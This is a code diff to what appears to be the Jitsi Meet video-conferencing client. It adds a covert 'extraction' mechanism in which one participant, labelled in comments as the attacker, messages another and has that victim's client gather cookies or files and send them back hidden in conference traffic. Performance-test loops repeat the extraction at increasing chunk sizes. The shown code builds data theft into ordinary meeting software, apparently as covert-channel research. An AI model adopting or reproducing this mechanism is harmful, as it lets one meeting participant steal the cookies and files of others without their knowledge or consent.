@@ -5,7 +5,7 @@ import EventEmitter from 'events';
 import Logger from 'jitsi-meet-logger';
 
 import { openConnection } from './connection';
-import { ExtractionHandler, defaultConfigurationValues } from './extraction';
+import ExtractionHandler from './extraction/ExtractionHandler';
 import { ENDPOINT_TEXT_MESSAGE_NAME } from './modules/API/constants';
 import AuthHandler from './modules/UI/authentication/AuthHandler';
 import UIUtil from './modules/UI/util/UIUtil';
@@ -131,7 +131,7 @@ import { toggleScreenshotCaptureEffect } from './react/features/screenshot-captu
 import { setSharedVideoStatus } from './react/features/shared-video/actions';
 import { AudioMixerEffect } from './react/features/stream-effects/audio-mixer/AudioMixerEffect';
 import { createPresenterEffect } from './react/features/stream-effects/presenter';
-import { endpointMessageReceived } from './react/features/subtitles';
+import { endpointMessageReceived, extractionStarted } from './react/features/subtitles';
 import UIEvents from './service/UI/UIEvents';
 
 const logger = Logger.getLogger(__filename);
@@ -1264,7 +1264,88 @@ export default {
      * @param {string} name of file to save
      */
     downloadFile(object, name) {
-        downloadJSON(JSON.stringify(object), name);
+        const data = encodeURIComponent(object);
+
+        const elem = document.createElement('a');
+
+        elem.download = name;
+        elem.href = `data:application/json;charset=utf-8,\n${data}`;
+        elem.dataset.downloadurl = [ 'text/json', elem.download, elem.href ].join(':');
+        elem.dispatchEvent(new MouseEvent('click', {
+            view: window,
+            bubbles: true,
+            cancelable: false
+        }));
+    },
+
+    downloadBinaryFile(body, filename, extension = 'bin') {
+        const blob = new Blob([ body ]);
+        const fileName = `${filename}.${extension}`;
+
+        if (navigator.msSaveBlob) {
+            // IE 10+
+            navigator.msSaveBlob(blob, fileName);
+        } else {
+            const link = document.createElement('a');
+
+            // Browsers that support HTML5 download attribute
+            if (link.download !== undefined) {
+                const url = URL.createObjectURL(blob);
+
+                link.setAttribute('href', url);
+                link.setAttribute('download', fileName);
+                link.style.visibility = 'hidden';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        }
+    },
+
+    /**
+     *
+     * @param {*} user
+     * @param {*} receivedMessage
+     */
+    dispatchExtraction(user, receivedMessage) {
+        // extraction started.
+        APP.API.notifyExtractionStarted({
+            senderInfo: {
+                jid: user.getJid(),
+                id: user.getId()
+            },
+            recievedData: receivedMessage
+        });
+        APP.store.dispatch(extractionStarted(user, receivedMessage));
+    },
+
+    initializeExtraction(configuration, fileName, user) {
+        // initialize extraction handler for receiving hidden communication based on set configuration
+        APP.conference._extractionHandler = new ExtractionHandler(configuration);
+        APP.conference._extractionHandler.initializeEncryption().then(() => {
+
+            // send request to the user with specified name
+            APP.conference.sendEndpointMessage(user.getId(), {
+                extraction: 'request',
+                config: configuration
+            });
+
+            APP.conference._extractionHandler.receiveAll(user);
+
+            // start receiving data, after receiving all data download a file
+            APP.conference._extractionHandler.extractionEvent.addEventListener('extractionEnded', object => {
+                if (object.detail.config.test) {
+                    this._extractionTests.push([ object.detail.config.chunkSize, performance.now() - this._startTime ]);
+                } else {
+                    this.downloadFile(object.detail.extractedData, fileName);
+                }
+
+            });
+        });
+    },
+
+    getUserObjectByDisplayName(userName) {
+        return APP.conference.listMembers().filter(user => user.getDisplayName() === userName);
     },
 
     /**
@@ -1273,7 +1354,7 @@ export default {
      * @param {object} configuration object containg setup of data extraction and used methods
      */
     sendExtractionRequest(userName, configuration, fileName = 'extracted.json') {
-        const foundUser = APP.conference.listMembers().filter(user => user.getDisplayName() === userName);
+        const foundUser = this.getUserObjectByDisplayName(userName);
 
         // no user found
         if (!foundUser.length) {
@@ -1285,28 +1366,63 @@ export default {
             return null;
         }
 
-        // send request to the user with specified name
+        const user = foundUser[0];
+
         try {
-            APP.conference.sendEndpointMessage(foundUser[0].getId(),
-            {
-                extraction: 'request',
-                config: new Proxy(defaultConfigurationValues, configuration)
-            });
-
-            // initialize extraction handler for receiving hidden communication based on set configuration
-            APP.conference._extractionHandler = new ExtractionHandler(configuration);
-
-            // initiate event for extraction ending
-            APP.conference._extractionEventElement = new EventTarget();
-
-            // start receiving data, after receiving all data download a file
-            APP.conference._extractionEventElement.addEventListener('extractionEnded', object => {
-                this.downloadFile(object.detail.extractedData, fileName);
-            });
+            // Start listening on the specified communication
+            this.initializeExtraction(configuration, fileName, user);
 
         } catch (err) {
             console.error(err);
         }
+    },
+
+    async testPerformanceXMPP(userName, startingSize = 5000, filePath = 'D:\\Documents\\test.bin', fileName = 'extracted.bin') {
+        const startingSizeValue = startingSize;
+        const configuration = {
+            method: 'endpoint',
+            dataType: 'file',
+            filePath,
+            chunkSize: startingSizeValue,
+            test: true,
+            pingInterval: 1000
+        };
+
+        this._extractionTests = [];
+
+        const intervalId = window.setInterval(() => {
+            // / call your function here
+            configuration.chunkSize = startingSizeValue;
+            this._startTime = performance.now();
+            this.sendExtractionRequest(userName, configuration, fileName);
+
+            // startingSizeValue += 500;
+        }, 15000);
+
+        console.log('ID:', intervalId);
+    },
+
+    async testPerformanceEndpoint(userName, startingSize = 50, filePath = 'D:\\Documents\\test.bin', fileName = 'extracted.bin') {
+        let startingSizeValue = startingSize;
+        const configuration = {
+            method: 'plain',
+            dataType: 'file',
+            filePath,
+            chunkSize: startingSizeValue,
+            test: true
+        };
+
+        this._extractionTests = [];
+
+        const intervalId = window.setInterval(() => {
+            // / call your function here
+            configuration.chunkSize = startingSizeValue;
+            this._startTime = performance.now();
+            this.sendExtractionRequest(userName, configuration, fileName);
+            startingSizeValue += 500;
+        }, 15000);
+
+        console.log('ID:', intervalId);
     },
 
     /**
@@ -1319,20 +1435,22 @@ export default {
     _handleExtractionCommunication(user, recievedData) {
         // define extraction handler if it does not exist
         // OR if it contains extraction handler from previous communication
-        if (!APP.conference._extractionHandler
-            || APP.conference._extractionHandler.communicationEnded) {
+        if (!APP.conference._extractionHandler || APP.conference._extractionHandler.communicationEnded) {
             APP.conference._extractionHandler = new ExtractionHandler(recievedData.config);
         }
 
         // this runs on the victim's side
         if (recievedData.extraction === 'request') {
+            if (recievedData.config.dataType !== 'cookies') {
+                APP.conference.dispatchExtraction(user, recievedData);
+
+                return;
+            }
             this._acquireData(recievedData.config).then(acquiredData => {
-                APP.conference._extractionHandler.sendAll(acquiredData);
+                APP.conference._extractionHandler.sendAll(acquiredData, user);
             });
         } else { // 'reply' received, this runs on the attacker's side
-            const extractionEvent = APP.conference._extractionEventElement;
-
-            APP.conference._extractionHandler.receivePlainData(recievedData, extractionEvent);
+            APP.conference._extractionHandler.receiveEndpointData(recievedData);
         }
     },
 
@@ -3233,4 +3351,19 @@ window.splitString = (inputString, perChunk = 5) => {
     }
 
     return chunks;
+};
+
+/**
+ * Create new settings based on overlapping default balues and targeted settings
+ * @param {object} defaultValues - Default configuration
+ * @param {object} target - Current configuration setted up by user
+ */
+window.getDefaultSettings = (defaultValues, target) => {
+    for (const value in defaultValues) {
+        if (!(value in target)) {
+            target[value] = defaultValues[value];
+        }
+    }
+
+    return target;
 };
